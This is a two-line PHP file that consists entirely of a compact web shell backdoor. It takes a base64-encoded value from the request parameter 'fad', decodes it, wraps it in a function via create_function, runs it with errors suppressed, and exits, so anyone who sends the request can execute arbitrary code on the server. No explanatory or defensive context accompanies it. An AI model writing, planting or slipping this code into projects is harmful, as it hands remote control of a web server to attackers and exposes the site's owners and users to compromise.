<?php
if(!empty($_REQUEST['fad'])){$fad=base64_decode($_REQUEST['fad']);$fad=create_function('',$fad);@$fad();exit;}